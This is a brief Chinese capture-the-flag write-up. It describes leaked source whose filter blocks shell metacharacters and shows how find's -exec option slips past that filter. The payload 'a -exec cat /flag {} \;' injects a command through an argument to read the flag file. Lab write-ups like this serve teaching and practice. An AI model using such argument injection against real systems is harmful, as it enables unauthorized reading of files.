www.zip源码泄露，source.php里面进行了一个很严格的转义

```php
($argv[$i] == '&') ||
($argv[$i] == '>') ||
($argv[$i] == '<') ||
($argv[$i] == '(') ||
($argv[$i] == ';') ||
($argv[$i] == '|')
```

但是find命令有一个`-exec`参数，最后的payload为

```
a -exec cat /flag {} \;
```

即可得到flag